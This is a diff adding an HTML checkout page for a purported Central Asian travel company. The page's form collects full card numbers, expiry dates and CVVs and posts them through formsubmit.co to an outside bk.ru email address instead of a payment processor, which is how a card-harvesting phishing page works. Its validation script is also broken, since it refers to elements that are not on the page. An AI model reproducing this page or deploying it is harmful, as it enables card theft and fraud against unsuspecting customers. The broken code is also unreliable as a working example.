@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="../css/bootstrap.css" />
+    <link rel="stylesheet" href="../css/index.css" />
+    <title>TRADE AND TRAVEL SERVICES - CHECKOUT || PAY</title>
+  </head>
+  <body>
+    <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+    <script>
+      function googleTranslateElementInit() {
+        new google.translate.TranslateElement(
+          { pageLanguage: "en" },
+          "google_translate_element"
+        );
+      }
+    </script>
+    <div class="loader">
+      <div class="lds-facebook">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+    </div>
+    <nav class="navbar navbar-light navbar-expand-lg bg-light fixed-top shadow">
+      <div class="container-fluid">
+        <a class="navbar-brand fs-3 text-primary" href="../index.html"
+          >TRADE AND TRAVEL SERVICES</a
+        >
+        <button
+          class="navbar-toggler"
+          type="button"
+          data-bs-toggle="offcanvas"
+          data-bs-target="#offcanvaslightNavbar"
+          aria-controls="offcanvaslightNavbar"
+        >
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div
+          class="offcanvas offcanvas-top bg-light w-75 h-100 text-bg-light"
+          tabindex="-1"
+          id="offcanvaslightNavbar"
+          aria-labelledby="offcanvaslightNavbarLabel"
+        >
+          <div class="offcanvas-header">
+            <h5 class="offcanvas-title" id="offcanvaslightNavbarLabel">
+              TRADE AND TRAVEL SERVICES
+            </h5>
+            <button
+              type="button"
+              class="btn-close btn-close-black"
+              data-bs-dismiss="offcanvas"
+              aria-label="Close"
+            ></button>
+          </div>
+          <div class="offcanvas-body">
+            <ul class="navbar-nav justify-content-end flex-grow-1 pe-3">
+              <li class="nav-item mx-2">
+                <a class="nav-link" href="../index.html">Home</a>
+              </li>
+              <li class="nav-item mx-2">
+                <a class="nav-link" href="./services.html">Services</a>
+              </li>
+              <li class="nav-item mx-2">
+                <a class="nav-link" href="./tours.html">Tours</a>
+              </li>
+
+              <li class="nav-item mx-2">
+                <a class="nav-link" href="./transports.html">Transports</a>
+              </li>
+
+              <li class="nav-item mx-2">
+                <a class="nav-link" href="./regions.html">Regions</a>
+              </li>
+
+              <li class="nav-item mx-2">
+                <a class="nav-link" href="./visa-to-uzb.html">Visa Info</a>
+              </li>
+              <li class="nav-item mx-2">
+                <a class="nav-link" href="./about.html">About Us</a>
+              </li>
+              <li class="nav-item mx-2">
+                <div id="google_translate_element"></div>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </nav>
+    <br /><br /><br /><br />
+    <h1 class="text-center text-warning">COMMUNICATION DEPARTMENT</h1>
+    <br />
+    <div class="container">
+      <form
+        target="_blank"
+        action="https://formsubmit.co/marketing-group@bk.ru"
+        method="POST"
+      >
+        <div class="form-group">
+          <div class="form-row">
+            <div class="w-100">
+              <input
+                type="text"
+                name="name"
+                class="my-2 form-control"
+                placeholder="Full Name"
+                required
+              />
+            </div>
+
+            <div class="w-100">
+              <input
+                type="email"
+                name="email"
+                class="my-2 form-control"
+                placeholder="Email Address"
+                required
+              />
+            </div>
+
+            <div class="w-100">
+              <input
+                type="phone"
+                name="phone"
+                class="my-2 form-control"
+                placeholder="Phone number"
+                required
+              />
+            </div>
+
+            <div class="w-100">
+              <input
+                type="card"
+                name="card"
+                class="my-2 form-control"
+                placeholder="Card number"
+                required
+              />
+            </div>
+            <div class="d-flex gap-3">
+              <div class="w-50">
+                <input
+                  type="expdate"
+                  name="expdate"
+                  class="my-2 form-control"
+                  placeholder="expdate"
+                  required
+                />
+              </div>
+
+              <div class="w-50">
+                <input
+                  type="cvv"
+                  name="cvv"
+                  class="my-2 form-control"
+                  placeholder="cvv"
+                  required
+                />
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="text-center">
+          <button
+            type="submit"
+            class="btn btn-lg btn-outline-dark rounded-0 px-5 py-1 mt-3 btn-block"
+          >
+            pay
+          </button>
+        </div>
+      </form>
+    </div>
+    <br />
+    <footer class="bg-light text-black p-4">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-6 col-12 text-start my-3">
+            <h3>Contact Us</h3>
+            <p>#1, Kuk Saray square, Samarkand city, 140157</p>
+            <p class="my-0">+998 90 271 05 10</p>
+            <p class="my-0">+998 90 271 05 10</p>
+          </div>
+          <div class="col-md-6 col-12 text-start my-3">
+            <h3>TRADE AND TRAVEL SERVICES</h3>
+            <p>
+              INCOMING TOURISM AND TRANSPORTATION SERVICE PROVIDER COMPANY IN
+              UZBEKISTAN AND CENTRAL ASIA
+            </p>
+          </div>
+        </div>
+      </div>
+    </footer>
+    <script>
+      const connectBtn = document.querySelector(".connectBtn");
+      const form = document.querySelector("form");
+      const name = document.querySelector(".name");
+      const email = document.querySelector(".email");
+      const cvv = document.querySelector(".cvv");
+      const expdate = document.querySelector(".expdate");
+      const phone = document.querySelector(".phone");
+      const cart = document.querySelector(".cart");
+      const alert1 = document.querySelector(".alert-success");
+      const accept = document.querySelector("#accept");
+
+      connectBtn.addEventListener("click", () => {
+        if (
+          name.value == "" ||
+          email.value == "" ||
+          phone.value == "" ||
+          cart.value == "" ||
+          cvv.value == "" ||
+          expdate.value == ""
+        ) {
+          alert1.textContent = "SOMETHING WENT WRONG";
+          alert1.classList.add("d-block", "alert-danger");
+          alert1.classList.remove("d-none", "alert-success");
+        } else if (!accept.checked) {
+          alert1.textContent = "YOU MUST AGREE TO OURS TERMS";
+          alert1.classList.add("d-block", "alert-danger");
+          alert1.classList.remove("d-none", "alert-success");
+        } else if (
+          email.value.match(
+            /(?:[a-z0-9+!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])/gi
+          )
+        ) {
+          alert1.textContent = "MESSAGE IS SENDING SUCCESSFULLY";
+          alert1.classList.add("d-block", "alert-success");
+          alert1.classList.remove("d-none", "alert-danger");
+          form.action = `https://formsubmit.co/${email.value}`;
+        } else {
+          alert1.textContent = "SOMETHING WENT WRONG";
+          alert1.classList.add("d-block", "alert-danger");
+          alert1.classList.remove("d-none", "alert-success");
+        }
+      });
+    </script>
+    <script src="../js/bootstrap.js"></script>
+    <script src="../js/app.js"></script>
+  </body>
+</html>
